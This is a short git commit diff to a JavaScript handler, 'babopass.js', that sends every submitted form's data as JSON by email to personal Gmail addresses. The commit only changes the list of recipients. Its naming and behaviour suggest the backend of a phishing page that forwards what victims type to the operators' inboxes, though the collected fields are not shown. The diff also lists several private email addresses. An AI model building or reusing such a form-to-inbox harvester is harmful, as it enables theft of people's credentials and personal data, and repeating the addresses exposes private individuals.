fc2423d5caca807fe06ec9c61c6bf20ea975d01b
saodali <tumpagoodtemple@gmail.com>
2025-08-11 11:57:01 +0500

    Update babopass.js

--- babopass.js
+++ babopass.js
@@ -37,7 +37,7 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "newzatpage.@gmail.com,submitdispute@gmail.com",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,",
       subject: "Babo",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
